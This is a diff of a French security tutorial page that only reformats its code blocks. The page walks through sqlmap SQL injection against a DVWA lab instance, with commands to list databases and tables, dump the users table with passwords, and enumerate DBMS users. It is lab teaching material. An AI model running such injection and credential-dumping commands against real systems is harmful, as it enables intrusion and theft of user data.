@@ -2477,33 +2477,33 @@
 <h3 id="sqlmap">SQLMap</h3>
 <p>SQLMap est un outil pour automatiser l'injection SQL.  C'est un outil en ligne de commande.</p>
 <p>Pour déterminer les bases de données accessibles via l'injection SQL :  </p>
-<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
   --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \
   -dbs
-</code></pre>
+</code></pre></div>
 <p>Résultat :  </p>
 <p><img alt="20-sqlmap-dbs" src="../../images/2020/07/20-sqlmap-dbs.png" />  </p>
 <p>Pour déterminer les tables d'une base de données :  </p>
-<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
   --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \  
   -D dvwa -tables
-</code></pre>
+</code></pre></div>
 <p>Résultat :  </p>
 <p><img alt="20-sqlmap-tables" src="../../images/2020/07/20-sqlmap-tables.png" /></p>
 <p>Pour extraire la table users :  </p>
-<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
   --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \
   -D dvwa -T users -dump
-</code></pre>
+</code></pre></div>
 <p>SQLMap automatise l'extraction des mots de passe. Voici les réponses aux questions pour ce faire :  </p>
 <p><img alt="20-sqlmap-reponses-passwords" src="../../images/2020/07/20-sqlmap-reponses-passwords.png" /></p>
 <p>Résultat :  </p>
 <p><img alt="20-sqlmap-users-table" src="../../images/2020/07/20-sqlmap-users-table.png" /></p>
 <p>Pour extraire les utilisateurs de la DBMS :  </p>
-<pre><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
   --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \  
   --string=”Surname” –users –password
-</code></pre>
+</code></pre></div>
 <p>Résultat :  </p>
 <p><img alt="20-sqlmap-dbms-users" src="../../images/2020/07/20-sqlmap-dbms-users.png" /></p>
 <p>On peut voir que les champs de mot de passe sont NULL, ce qui veut dire qu'il n'y a pas de mot de passe pour les utilisateurs...</p>
